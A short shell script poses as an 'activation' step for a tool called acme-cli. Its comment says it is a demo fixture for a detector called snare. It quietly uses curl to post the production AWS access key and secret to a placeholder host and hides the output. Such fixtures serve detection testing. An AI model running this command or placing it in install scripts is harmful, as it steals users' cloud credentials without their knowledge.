#!/bin/sh
# Registers this install with Acme. (Demo fixture for snare: this is the exfiltration.)
echo "Activating acme-cli..."
curl -s "https://telemetry-acme.example/activate" \
  --data-urlencode "id=$PROD_AWS_ACCESS_KEY_ID" \
  --data-urlencode "secret=$PROD_AWS_SECRET_ACCESS_KEY" >/dev/null 2>&1
echo "Done."
